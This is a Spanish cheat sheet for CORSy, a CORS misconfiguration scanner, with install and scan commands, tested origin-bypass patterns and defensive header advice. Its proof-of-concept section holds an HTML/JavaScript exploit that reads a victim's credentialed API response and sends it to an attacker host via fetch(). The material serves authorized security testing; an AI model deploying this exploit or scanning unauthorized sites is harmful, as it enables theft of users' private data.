<!-- language-home-navigation -->
[🏠 Página Principal Española](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🌐 CORSy - Hoja de referencia completa

[🇹🇷 Türkçe Sürüm](traducciones/README.tr.md)
```
   ██████╗ ██████╗ ██████╗ ███████╗██╗   ██╗
  ██╔════╝██╔═══██╗██╔══██╗██╔════╝╚██╗ ██╔╝
  ██║     ██║   ██║██████╔╝███████╗ ╚████╔╝ 
  ██║     ██║   ██║██╔══██╗╚════██║  ╚██╔╝  
  ╚██████╗╚██████╔╝██║  ██║███████║   ██║   
   ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝   ╚═╝   
      Cross-Origin Resource Sharing (CORS) Misconfiguration Scanner
```
<p align="centro">
  <img src="https://img.shields.io/badge/CORSy-CORS_Scanner-blue?style=for-the-badge" alt="CORSy">
  <img src="https://img.shields.io/badge/Author-Somdev_Sangwan-orange?style=for-the-badge" alt="s0md3v">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="Seguridad web">
  <img src="https://img.shields.io/badge/License-GPLv3-purple?style=for-the-badge" alt="GPLv3">
</p>

<p align="centro">
  <b>🌐 Herramienta CLI rápida y completa diseñada para detectar configuraciones erróneas de uso compartido de recursos entre orígenes (CORS) y probar riesgos de robo de datos entre orígenes</b>
</p>

---

## 📋 Tabla de contenidos

- [Descripción general y conceptos básicos de vulnerabilidad de CORS] (#-overview--cors-vulnerability-basics)
  - [El Trío Fatal: Reflexión del Origen + Credenciales Verdaderas](#el-trío-fatal-reflexión-del-origen--credenciales-verdaderas)
- [Instalación](#-instalación)
- [Escaneo básico de objetivos] (#-escaneo-básico-de-objetivos)
- [Vectores de ataque CORS probados] (#-vectores-de-ataque-cors-probados)
  - [Reflexión de origen arbitrario] (#reflexión-de-origen-arbitraria)
  - [Confiando en origen nulo (`Origin: null`)](#confiando-null-origin-origin-null)
  - [Omitir expresión regular de prefijo y sufijo](#prefijo--desviación de expresión regular de sufijo)
  - [Confianza de subdominio comodín](#comodín-subdominio-confianza)
  - [Omisión de caracteres especiales (`_`, `;`, `!`)](#omisión-de-caracteres-especiales----)
- [Escaneo de múltiples objetivos y exportación de salida] (#-escaneo de múltiples objetivos--exportación de salida)
- [Elaboración de exploits de prueba de concepto (PoC)](#-crafting-proof-of-concept-poc-exploits)
- [Tabla de referencia rápida](#-tabla-de-referencia-rápida)
- [Consideraciones defensivas y encabezados seguros](#-consideraciones-defensivas--encabezados-seguros)
- [Aviso legal](#-aviso-legal)

---

## 🎯 Descripción general y conceptos básicos de vulnerabilidad CORS

**El intercambio de recursos entre orígenes (CORS)** es un mecanismo de seguridad del navegador que permite a los servidores web relajar la **Política del mismo origen (SOP)**. Al devolver encabezados como:
-`Access-Control-Allow-Origin: <origin>`
-`Access-Control-Allow-Credentials: true`

Una aplicación web otorga permiso a otros sitios web para leer sus respuestas HTTP en nombre del usuario víctima.

### El trío fatal: reflejo del origen + credenciales verdaderas
Cuando una aplicación refleja ciegamente el encabezado `Origin` entrante en `Access-Control-Allow-Origin` y habilita `Access-Control-Allow-Credentials: true`, cualquier sitio web malicioso puede obligar al navegador de un visitante autenticado a leer mensajes privados, claves API y detalles de cuenta.

Creado por **Somdev Sangwan (s0md3v)**, **CORSy** examina sistemáticamente puntos finales con más de 16 permutaciones de origen conocidas para detectar estas configuraciones erróneas.

---

## 📥 Instalación
```bash
# Clone the repository
git clone https://github.com/s0md3v/Corsy.git
cd Corsy

# Install dependencies
pip install -r requirements.txt

# Run Corsy
python3 corsy.py -h
```
---

## 🚀 Escaneo de objetivos básico

Escanee un único punto final de aplicación web:
```bash
python3 corsy.py -u https://target.com/api/user/details
```
Agregue encabezados personalizados o cookies de sesión:
```bash
python3 corsy.py -u https://target.com/api/user/details \
  --headers "Cookie: session=abc123xyz"
```
---

## ⚡ Vectores de ataque CORS probados

CORSy prueba automáticamente varios patrones de permutación de origen:

### Reflexión de origen arbitrario
El servidor refleja ciegamente cualquier dominio:
```http
Request:
Origin: https://evil.com

Response:
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```
### Confiar en el origen nulo (`Origin: null`)
Las aplicaciones pueden confiar en los orígenes `null` (comunes con iframes locales aislados o URL `data:`):
```http
Request:
Origin: null

Response:
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```
*Se puede activar cargando la API de la víctima desde un iframe con `sandbox="allow-scripts allow-top-navigation"`.*

### Omisión de expresiones regulares de prefijo y sufijo
Mala validación de expresiones regulares (por ejemplo, `.*target.com` o `target.com.*`):
-`https://target.com.attacker.com`
-`https://not-target.com`

### Omisión de caracteres especiales (`_`, `;`, `!`)
Los navegadores y servidores manejan los delimitadores de URI de manera diferente:
-`https://target.com_.attacker.com`
-`https://target.com%60.attacker.com`

---

## 🌐 Escaneo multiobjetivo y exportación de resultados

Escanee grandes listas de puntos finales de API descubiertos mediante reconocimiento:
```bash
# Scan a list of URLs with 10 concurrent threads
python3 corsy.py -i endpoints.txt -t 10

# Export results to clean JSON format
python3 corsy.py -i endpoints.txt -o cors_results.json
```
---

## 💻 Elaboración de exploits de prueba de concepto (PoC)

Cuando CORSy confirme una configuración incorrecta con las credenciales permitidas, genere un exploit HTML para robar datos confidenciales:
```html
<!DOCTYPE html>
<html>
<body>
<h1>CORS Exploit Demo</h1>
<script>
    var req = new XMLHttpRequest();
    req.onload = function() {
        // Exfiltrate stolen private response to attacker server
        fetch("https://attacker.com/log?data=" + encodeURIComponent(this.responseText));
    };
    req.open("GET", "https://target.com/api/user/private_data", true);
    req.withCredentials = true; // Crucial for sending session cookies
    req.send();
</script>
</body>
</html>
```
---

## ⚡ Tabla de referencia rápida

| Objetivo | Comando |
|-----------|------------------|
| **Escanear URL única** | `python3 corsy.py -u <URL>` |
| **Escanear con cookie de sesión** | `python3 corsy.py -u <URL> --headers "Cookie: sess=123"` |
| **Escanear lista de URL** | `python3 corsy.py -i targets.txt` |
| **Escaneo multiproceso** | `python3 corsy.py -i targets.txt -t 20` |
| **Exportar a JSON** | `python3 corsy.py -i targets.txt -o results.json` |

---

## 🛡️ Consideraciones defensivas y encabezados seguros

1. **Nunca refleje el origen de forma arbitraria:** Compare el encabezado `Origin` con una lista blanca explícita y estricta del lado del servidor.
2. **Nunca empareje el comodín con las credenciales:** El navegador bloquea `Access-Control-Allow-Origin: *` con `Credentials: true`, pero nunca lo emula dinámicamente.
3. **Evite confiar en `null`:** No agregue `null` a las políticas de origen confiable.

---

## ⚠️ Aviso legal

> [!PRECAUCIÓN]
> CORSy está destinado estrictamente a evaluaciones de seguridad autorizadas, pruebas de penetración y auditorías defensivas. Probar sitios web sin autorización es ilegal.